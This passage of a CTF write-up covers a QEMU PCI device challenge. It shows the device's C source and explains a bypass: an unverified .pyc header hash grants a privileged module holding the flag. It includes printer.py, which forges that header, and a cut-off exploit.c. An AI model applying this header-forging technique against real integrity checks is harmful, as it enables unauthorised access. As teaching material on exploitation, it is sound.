<span class="k">static</span> <span class="kt">void</span> <span class="nf">pypu_pci_realize</span><span class="p">(</span><span class="n">PCIDevice</span> <span class="o">*</span><span class="n">pdev</span><span class="p">,</span> <span class="n">Error</span> <span class="o">**</span><span class="n">errp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PypuPCIState</span> <span class="o">*</span><span class="n">state</span> <span class="o">=</span> <span class="n">PYPU_PCI</span><span class="p">(</span><span class="n">pdev</span><span class="p">);</span>

    <span class="n">qemu_mutex_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_mutex</span><span class="p">);</span>
    <span class="n">qemu_cond_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_cond</span><span class="p">);</span>
    <span class="n">state</span><span class="o">-&gt;</span><span class="n">py_thread_alive</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
    <span class="n">state</span><span class="o">-&gt;</span><span class="n">work_gen</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">state</span><span class="o">-&gt;</span><span class="n">done_gen</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">g_autofree</span> <span class="kt">char</span> <span class="o">*</span><span class="n">flag_file</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">g_file_get_contents</span><span class="p">(</span><span class="s">"/flag"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">flag_file</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">pstrcpy</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">flag</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">flag</span><span class="p">),</span> <span class="n">flag_file</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">qemu_thread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_thread</span><span class="p">,</span> <span class="s">"pypu-py"</span><span class="p">,</span> <span class="n">python_worker</span><span class="p">,</span> <span class="n">state</span><span class="p">,</span>
                       <span class="n">QEMU_THREAD_JOINABLE</span><span class="p">);</span>

    <span class="n">pci_config_set_vendor_id</span><span class="p">(</span><span class="n">pdev</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">,</span> <span class="mh">0x1337</span><span class="p">);</span>
    <span class="n">pci_config_set_device_id</span><span class="p">(</span><span class="n">pdev</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">,</span> <span class="mh">0x1225</span><span class="p">);</span>
    <span class="n">pci_config_set_class</span><span class="p">(</span><span class="n">pdev</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">,</span> <span class="n">PCI_CLASS_OTHERS</span><span class="p">);</span>

    <span class="n">memory_region_init_io</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">mmio</span><span class="p">,</span> <span class="n">OBJECT</span><span class="p">(</span><span class="n">pdev</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">pypu_mmio_ops</span><span class="p">,</span> <span class="n">state</span><span class="p">,</span>
                          <span class="s">"pypu-mmio"</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
    <span class="n">pci_register_bar</span><span class="p">(</span><span class="n">pdev</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PCI_BASE_ADDRESS_SPACE_MEMORY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">mmio</span><span class="p">);</span>
    <span class="n">memory_region_init_io</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stdout_mmio</span><span class="p">,</span> <span class="n">OBJECT</span><span class="p">(</span><span class="n">pdev</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">pypu_stdout_ops</span><span class="p">,</span> <span class="n">state</span><span class="p">,</span>
                          <span class="s">"pypu-stdout"</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stdout_capture</span><span class="p">));</span>
    <span class="n">pci_register_bar</span><span class="p">(</span><span class="n">pdev</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">PCI_BASE_ADDRESS_SPACE_MEMORY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stdout_mmio</span><span class="p">);</span>
    <span class="n">memory_region_init_io</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stderr_mmio</span><span class="p">,</span> <span class="n">OBJECT</span><span class="p">(</span><span class="n">pdev</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">pypu_stderr_ops</span><span class="p">,</span> <span class="n">state</span><span class="p">,</span>
                          <span class="s">"pypu-stderr"</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stderr_capture</span><span class="p">));</span>
    <span class="n">pci_register_bar</span><span class="p">(</span><span class="n">pdev</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">PCI_BASE_ADDRESS_SPACE_MEMORY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stderr_mmio</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">pypu_pci_class_init</span><span class="p">(</span><span class="n">ObjectClass</span> <span class="o">*</span><span class="n">klass</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">DeviceClass</span> <span class="o">*</span><span class="n">dc</span> <span class="o">=</span> <span class="n">DEVICE_CLASS</span><span class="p">(</span><span class="n">klass</span><span class="p">);</span>
    <span class="n">PCIDeviceClass</span> <span class="o">*</span><span class="n">k</span> <span class="o">=</span> <span class="n">PCI_DEVICE_CLASS</span><span class="p">(</span><span class="n">klass</span><span class="p">);</span>

    <span class="n">dc</span><span class="o">-&gt;</span><span class="n">legacy_reset</span> <span class="o">=</span> <span class="n">pypu_pci_reset</span><span class="p">;</span>
    <span class="n">dc</span><span class="o">-&gt;</span><span class="n">desc</span> <span class="o">=</span> <span class="s">"Python Processing Unit (pypu)"</span><span class="p">;</span>
    <span class="n">dc</span><span class="o">-&gt;</span><span class="n">hotpluggable</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>

    <span class="n">k</span><span class="o">-&gt;</span><span class="n">class_id</span> <span class="o">=</span> <span class="n">PCI_CLASS_OTHERS</span><span class="p">;</span>
    <span class="n">k</span><span class="o">-&gt;</span><span class="n">realize</span> <span class="o">=</span> <span class="n">pypu_pci_realize</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">pypu_pci_finalize</span><span class="p">(</span><span class="n">Object</span> <span class="o">*</span><span class="n">obj</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PypuPCIState</span> <span class="o">*</span><span class="n">state</span> <span class="o">=</span> <span class="n">PYPU_PCI</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span>

    <span class="n">qemu_mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_mutex</span><span class="p">);</span>
    <span class="n">state</span><span class="o">-&gt;</span><span class="n">py_thread_alive</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
    <span class="n">qemu_cond_signal</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_cond</span><span class="p">);</span>
    <span class="n">qemu_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_mutex</span><span class="p">);</span>
    <span class="n">qemu_thread_join</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_thread</span><span class="p">);</span>
    <span class="n">qemu_cond_destroy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_cond</span><span class="p">);</span>
    <span class="n">qemu_mutex_destroy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_mutex</span><span class="p">);</span>

    <span class="n">PyGILState_STATE</span> <span class="n">gil</span> <span class="o">=</span> <span class="n">PyGILState_Ensure</span><span class="p">();</span>
    <span class="n">Py_XDECREF</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">globals_dict</span><span class="p">);</span>
    <span class="n">Py_XDECREF</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">gifts_module</span><span class="p">);</span>
    <span class="n">state</span><span class="o">-&gt;</span><span class="n">globals_dict</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">state</span><span class="o">-&gt;</span><span class="n">gifts_module</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">PyGILState_Release</span><span class="p">(</span><span class="n">gil</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="k">const</span> <span class="n">TypeInfo</span> <span class="n">pypu_pci_info</span> <span class="o">=</span> <span class="p">{</span>
    <span class="p">.</span><span class="n">name</span>          <span class="o">=</span> <span class="n">TYPE_PYPU_PCI</span><span class="p">,</span>
    <span class="p">.</span><span class="n">parent</span>        <span class="o">=</span> <span class="n">TYPE_PCI_DEVICE</span><span class="p">,</span>
    <span class="p">.</span><span class="n">instance_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PypuPCIState</span><span class="p">),</span>
    <span class="p">.</span><span class="n">class_init</span>    <span class="o">=</span> <span class="n">pypu_pci_class_init</span><span class="p">,</span>
    <span class="p">.</span><span class="n">instance_finalize</span> <span class="o">=</span> <span class="n">pypu_pci_finalize</span><span class="p">,</span>
    <span class="p">.</span><span class="n">interfaces</span> <span class="o">=</span> <span class="p">(</span><span class="n">InterfaceInfo</span><span class="p">[])</span> <span class="p">{</span>
        <span class="p">{</span> <span class="n">INTERFACE_PCIE_DEVICE</span> <span class="p">},</span>
        <span class="p">{</span> <span class="p">}</span>
    <span class="p">},</span>
<span class="p">};</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">pypu_pci_register_types</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">type_register_static</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pypu_pci_info</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">type_init</span><span class="p">(</span><span class="n">pypu_pci_register_types</span><span class="p">);</span>
</pre></table></code></div></div></details> <details> <summary>Click to view <code>src/pypu-privileged.h</code></summary><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="cp">#pragma once
#define PYPU_PRIVILEGED_HASH 0xf0a0101a75bc9dd3ULL
</span></pre></table></code></div></div></details><p>The provided <code class="language-plaintext highlighter-rouge">run.sh</code> launches a QEMU VM and attaches a custom PCI device with source code provided at <code class="language-plaintext highlighter-rouge">src/</code>. When the device is realized (initialized) in <code class="language-plaintext highlighter-rouge">pypu_pci_realize</code>, it reads the flag from the host‚Äôs filesystem and stores it in the device‚Äôs internal state memory (<code class="language-plaintext highlighter-rouge">state-&gt;flag</code>)</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c1">// pypu-pci.c</span>
<span class="k">if</span> <span class="p">(</span><span class="n">g_file_get_contents</span><span class="p">(</span><span class="s">"/flag"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">flag_file</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">pstrcpy</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">flag</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">flag</span><span class="p">),</span> <span class="n">flag_file</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The device spawns a dedicated worker thread to handle execution:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">qemu_thread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">py_thread</span><span class="p">,</span> <span class="s">"pypu-py"</span><span class="p">,</span> <span class="n">python_worker</span><span class="p">,</span> <span class="n">state</span><span class="p">,</span>
                   <span class="n">QEMU_THREAD_JOINABLE</span><span class="p">);</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">python_worker</code> function performs the following actions:</p><ul><li>Installs Landlock restrictions immediately via <code class="language-plaintext highlighter-rouge">enable_landlock()</code>, preventing file system access (except for python libs). This means we cannot simply <code class="language-plaintext highlighter-rouge">open("/flag")</code> via Python code.<li>It enters a loop waiting for a <code class="language-plaintext highlighter-rouge">work</code> signal triggered by the guest writing to the MMIO Control register (offset <code class="language-plaintext highlighter-rouge">0x0C</code>).<li>When work is signaled, it copies bytecode from the MMIO buffer (<code class="language-plaintext highlighter-rouge">state-&gt;code</code>) and passes it to <code class="language-plaintext highlighter-rouge">execute_python_code</code>.</ul><p>To allow the guest to retrieve output, <code class="language-plaintext highlighter-rouge">pypu_get_globals()</code> redirects the Python environment‚Äôs standard output streams to internal buffers:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">sys</span><span class="p">.</span><span class="n">stdout</span> <span class="o">=</span> <span class="n">pypu_capture_new</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stdout_capture</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stdout_capture</span><span class="p">));</span>
<span class="n">sys</span><span class="p">.</span><span class="n">stderr</span> <span class="o">=</span> <span class="n">pypu_capture_new</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stderr_capture</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stderr_capture</span><span class="p">));</span>
</pre></table></code></div></div><p>These buffers are mapped as PCI BARs (BAR1 for stdout, BAR2 for stderr), allowing the guest to read the output of <code class="language-plaintext highlighter-rouge">print()</code> calls directly via MMIO reads. The crucial part of the analysis lies in how <code class="language-plaintext highlighter-rouge">state-&gt;flag</code> is exposed. It is placed into a special Python module named gifts. However, this module is only injected into sys.modules if the code is deemed <code class="language-plaintext highlighter-rouge">privileged</code>:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="c1">// pypu-pci.c</span>
<span class="n">bool</span> <span class="n">privileged</span> <span class="o">=</span> <span class="n">pyc_hash</span> <span class="o">==</span> <span class="n">PYPU_PRIVILEGED_HASH</span><span class="p">;</span>
<span class="c1">// ...</span>
<span class="k">if</span> <span class="p">(</span><span class="n">privileged</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">PyDict_SetItemString</span><span class="p">(</span><span class="n">modules</span><span class="p">,</span> <span class="s">"gifts"</span><span class="p">,</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">gifts_module</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The vulnerability is that <code class="language-plaintext highlighter-rouge">pyc_hash</code> is read directly from the user-provided .pyc header without verification. By forging this hash, we can gain access to the gifts module and print the flag.</p><p>Notice that the device use <code class="language-plaintext highlighter-rouge">python3.13</code>, so we have tp use <code class="language-plaintext highlighter-rouge">python3.13</code> to compile our payload to pass the <code class="language-plaintext highlighter-rouge">MagicNumber</code> check.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="c1">// pypu-pci.c</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">enable_landlock</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>

    <span class="kt">int</span> <span class="n">lib_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/usr/lib/python3.13"</span><span class="p">,</span> <span class="n">O_PATH</span> <span class="o">|</span> <span class="n">O_DIRECTORY</span><span class="p">);</span>
    
    <span class="k">if</span> <span class="p">(</span><span class="n">lib_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">debug_log</span><span class="p">(</span><span class="s">"[pypu] open python stdlib failed: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
        <span class="n">close</span><span class="p">(</span><span class="n">ruleset_fd</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="p">...</span>
<span class="p">}</span>
</pre></table></code></div></div><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c1">// pypu-pci.c</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">expected_magic</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">PyImport_GetMagicNumber</span><span class="p">();</span>
<span class="p">...</span>
<span class="k">if</span> <span class="p">(</span><span class="n">header_magic</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">expected_magic</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">debug_log</span><span class="p">(</span><span class="s">"[pypu] abort: bad pyc magic</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><hr /><h3 id="exploitation-8"><span class="me-2">Exploitation</span><a href="#exploitation-8" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Our strategy is:</p><ul><li>Create a valid bytecode file (.pyc) but containing a forged Hasher Header.<li>Write a C program that runs on the Guest machine to load the payload into the device and read the results.</ul><h4 id="printerpy"><span class="me-2">printer.py</span><a href="#printerpy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>We can‚Äôt use the standard Python compiler because it would automatically fill in the current timestamp in the header. Instead, we use the <code class="language-plaintext highlighter-rouge">printer.py</code> script to manually build the .pyc file structure.</p><ul><li>Compile <code class="language-plaintext highlighter-rouge">import gifts; print(gifts.flag)</code> to code object<li>Use <code class="language-plaintext highlighter-rouge">marshal.dumps</code> to convert the code object to bytes<li>Forge header with <code class="language-plaintext highlighter-rouge">MagicNumber</code>, <code class="language-plaintext highlighter-rouge">0</code> flags, and <code class="language-plaintext highlighter-rouge">PYPU_PRIVILEGED_HASH</code></ul><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">magic</span> <span class="o">=</span> <span class="n">importlib</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">MAGIC_NUMBER</span>
<span class="n">flags</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sh">"</span><span class="s">little</span><span class="sh">"</span><span class="p">)</span>
<span class="n">hash_bytes</span> <span class="o">=</span> <span class="n">PYPU_PRIVILEGED_HASH</span><span class="p">.</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sh">"</span><span class="s">little</span><span class="sh">"</span><span class="p">)</span>

<span class="n">pyc</span> <span class="o">=</span> <span class="n">magic</span> <span class="o">+</span> <span class="n">flags</span> <span class="o">+</span> <span class="n">hash_bytes</span> <span class="o">+</span> <span class="n">payload</span>
</pre></table></code></div></div><h4 id="exploitc"><span class="me-2">exploit.c</span><a href="#exploitc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>First I‚Äôll scans the <code class="language-plaintext highlighter-rouge">/sys/bus/pci/devices/</code> directory. It reads the <code class="language-plaintext highlighter-rouge">vendor</code> and <code class="language-plaintext highlighter-rouge">device</code> files of each subdirectory to find the device with ID <code class="language-plaintext highlighter-rouge">0x1337:0x1225</code>.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c1">// pypu-pci.c</span>
<span class="n">pci_config_set_vendor_id</span><span class="p">(</span><span class="n">pdev</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">,</span> <span class="mh">0x1337</span><span class="p">);</span>
<span class="n">pci_config_set_device_id</span><span class="p">(</span><span class="n">pdev</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">,</span> <span class="mh">0x1225</span><span class="p">);</span>
</pre></table></code></div></div><p>After locating the device path, the program opens the resource files corresponding to the BAR (Base Address Register) registers:</p><ul><li><code class="language-plaintext highlighter-rouge">resource0</code> -&gt; BAR0 (Control/Code): Read/Write permission.<li><code class="language-plaintext highlighter-rouge">resource1</code> -&gt; BAR1 (Stdout): Read-only permission.<li><code class="language-plaintext highlighter-rouge">resource2</code> -&gt; BAR2 (Stderr): Read-only permission.</ul><p>By using mmap(), we can map these files to the process‚Äôs virtual memory so they can be <code class="language-plaintext highlighter-rouge">read/written</code> like regular variables.Then, we need to write each byte of our forged .pyc into buffer starting at offset <code class="language-plaintext highlighter-rouge">0x100</code> in BAR0. After writing the code, we set the code length at offset <code class="language-plaintext highlighter-rouge">0x10</code>, and finally trigger execution by writing to the control register at offset <code class="language-plaintext highlighter-rouge">0x0C</code>. And finally trigger execution by writting <code class="language-plaintext highlighter-rouge">1</code> to the control register at offset <code class="language-plaintext highlighter-rouge">0x0C</code>.</p><details> <summary>Click to view <code>printer.py</code></summary><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">marshal</span><span class="p">,</span> <span class="n">importlib</span><span class="p">.</span><span class="n">util</span><span class="p">,</span> <span class="n">textwrap</span>

<span class="n">PYPU_PRIVILEGED_HASH</span> <span class="o">=</span> <span class="mh">0xf0a0101a75bc9dd3</span>

<span class="n">src</span> <span class="o">=</span> <span class="n">textwrap</span><span class="p">.</span><span class="nf">dedent</span><span class="p">(</span><span class="sh">"""</span><span class="s">
import gifts
print(gifts.flag)
</span><span class="sh">"""</span><span class="p">)</span>

<span class="n">code</span> <span class="o">=</span> <span class="nf">compile</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="sh">"</span><span class="s">&lt;pypu&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">exec</span><span class="sh">"</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">marshal</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>

<span class="n">magic</span> <span class="o">=</span> <span class="n">importlib</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">MAGIC_NUMBER</span>
<span class="n">flags</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sh">"</span><span class="s">little</span><span class="sh">"</span><span class="p">)</span>
<span class="n">hash_bytes</span> <span class="o">=</span> <span class="n">PYPU_PRIVILEGED_HASH</span><span class="p">.</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sh">"</span><span class="s">little</span><span class="sh">"</span><span class="p">)</span>

<span class="n">pyc</span> <span class="o">=</span> <span class="n">magic</span> <span class="o">+</span> <span class="n">flags</span> <span class="o">+</span> <span class="n">hash_bytes</span> <span class="o">+</span> <span class="n">payload</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">unsigned char flag_printer_pyc[] = {</span><span class="sh">"</span><span class="p">)</span>

<span class="n">hex_array</span> <span class="o">=</span> <span class="p">[</span><span class="sa">f</span><span class="sh">"</span><span class="s">0x</span><span class="si">{</span><span class="n">b</span><span class="si">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="sh">"</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">pyc</span><span class="p">]</span>

<span class="n">columns</span> <span class="o">=</span> <span class="mi">12</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">hex_array</span><span class="p">),</span> <span class="n">columns</span><span class="p">):</span>
    <span class="n">chunk</span> <span class="o">=</span> <span class="n">hex_array</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">columns</span><span class="p">]</span>
    <span class="n">line</span> <span class="o">=</span> <span class="sh">"</span><span class="s">, </span><span class="sh">"</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">i</span> <span class="o">+</span> <span class="n">columns</span> <span class="o">&lt;</span> <span class="nf">len</span><span class="p">(</span><span class="n">hex_array</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  </span><span class="si">{</span><span class="n">line</span><span class="si">}</span><span class="s">,</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  </span><span class="si">{</span><span class="n">line</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">};</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">unsigned int flag_printer_pyc_len = </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">pyc</span><span class="p">)</span><span class="si">}</span><span class="s">;</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div></details> <details> <summary>Click to view <code>exploit.c</code></summary><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
